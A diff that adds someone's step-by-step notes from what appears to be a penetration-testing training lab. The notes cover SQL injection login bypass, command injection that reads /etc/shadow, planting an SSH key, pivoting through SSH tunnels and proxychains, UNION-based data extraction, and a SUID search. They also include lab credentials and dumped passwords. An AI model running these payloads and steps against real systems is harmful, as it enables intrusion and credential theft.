@@ -1,2 +1,151 @@
 Stack Number	Username	Password	jump
 19 	JASH-021-M 	nJvdyKrBJODW 	10.50.16.76
+
+192.168.28.175
+
+*****************************************************
+T1 10.50.16.76
+
+Nmap scan report for 10.50.16.76
+Host is up (0.00040s latency).
+Not shown: 997 closed ports
+PORT   STATE    SERVICE
+22/tcp open     ssh
+53/tcp filtered domain
+80/tcp open     http
+
+nmap --script=http-enum 10.50.16.76 (run this because you see http is open)
+/login.php: 
+/login.html:
+/img/
+/scripts/
+
+
+make a tunnel to the http and navigate to the ip in firefox
+
+ssh student@127.0.0.1 -L1111:10.50.16.76:80
+
+check each in firefox!!!:
+ /login.php: 
+/login.html:
+/img/
+/scripts/
+
+checked scripts and found development.py and found
+system_user=user2
+user_password=TurkeyDay24
+
+on <ip>/login.html
+found a login site, enter- "' Or 1 = '1" on both
+
+!!!!!dont get tunnel vision and check the rest of the homepage!!!
+
+on the apply.html found a site where you can upload a file
+
+on the main home page under CONTACT take down what you find.
+
+SCROLL DOWN AND CHECK BOTTOM OF THE PAGE ON FRIDAY COUD BE SOMETHING THERE!!!!
+
+upload.html allows us to do a malicious upload
+
+*******dont forget to check robots.txt**********
+
+but we dont
+
+going back to login site after entering the ' OR 1='1 and see that we now have an Admin page where we can enter txt and it says decode string
+
+entering text we see that we can do command injection.
+
+start running commands like: 
+cat /etc/hosts
+cat /etc/shadow
+cat /etc/passwd
+
+and save all that , we're looking for those that have shells.
+
+to do a ssh keygen
+
+; mkdir /var/www/.ssh
+; ls -lisa /var/www/.ssh
+; echo "sshkeygen.pub" >> /var/www/.ssh/authorized_hosts
+
+to find keygen "cat ~/.ssh/id_rsa.pub"
+
+go back to all enumeration and start commenting out things that dont mean anything to us.
+
+make a tunnel to the ip using what command injection account with a shell that we used. 
+
+once authenticated start checking directories: /tmp, /etc/hosts, 
+
+************also DO A PING SWEEP*********** SO WE HAVE THE RIGHT IP
+
+for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+
+64 bytes from 192.168.28.1: icmp_seq=1 ttl=64 time=0.154 ms
+64 bytes from 192.168.28.165: icmp_seq=1 ttl=63 time=1.97 ms
+64 bytes from 192.168.28.175: icmp_seq=1 ttl=63 time=0.307 ms
+
+GRAB THE .165
+
+open a new terminator session so we can enumerate other systems
+
+ssh -S /tmp/t1 -0 forward -D9050
+
+proxychains nmap 192.168.28.175 (which we found in /etc/hosts)
+2222 - ssh
+8000 - http
+
+netcat them both to verify
+
+also proxychains nmap the ping sweep address:
+192.168.28.165
+22
+8888
+
+make a tunnel ssh -S /tmp/t1 t1 -0 forward -L1111:192.168.28.175:8000
+
+now go to 127.0.0.1:1111 in firefox to view webpage
+
+can also use file upload site for directory traversal ex. (../../../../../../../etc/hosts)
+
+now the new webpage looks like sql, check each product by clicking one so in our example has: http://127.0.0.1:1113/pick.php?product=7
+
+so add after that a "space OR 1=1"
+
+after finding the vulnerable one enter UNION SELECT 1,2,3
+(we see that the order is wrong so update the 1,2,3 to reflect the 1,3,2)
+now it shows correctly
+
+after discorvering this use golden statement. 
+ip                                        query
+http://127.0.0.1:1113/pick.php?product=7 UNION SELECT user_id,username,name from siteusers.users
+
+
+<ip> UNION SELECT select table_schema,table_name,column_name from information_schema.columns
+1 	Aaron 	$nccyrObggbzW3na$
+2 	user2 	$GhexrlQnl24
+3 	user3 	$Obo4GURCva3nccyrf
+4 	Lee_Roth 	$Lroth
+4 	Lroth 	$nabgurecnffjbeq4GURntrf
+
+
+1 	Nneba 	$appleBottomJ3an$
+2 	hfre2 	$TurkeyDay24
+3 	hfre3 	$Bob4THEPin3apples
+4 	Yrr_Ebgu 	$Yebgu
+4 	Yebgu 	$anotherpassword4THEages
+
+copy all that and throw it into cyber chef
+
+document for BESTWEBAPP says nothing about trying to gain access. 
+
+ssh -S /tmp/t1 t1 -0 forward -L:1112:192.168.28.165:22
+ssh -MS /tmp/t2 user3@127.0.0.1 -p1112
+
+user3 works
+
+now that were on roundsensor  ls -lisa on /home
+
+cat /etc/hosts
+
+find / -perm /6000 -type f 
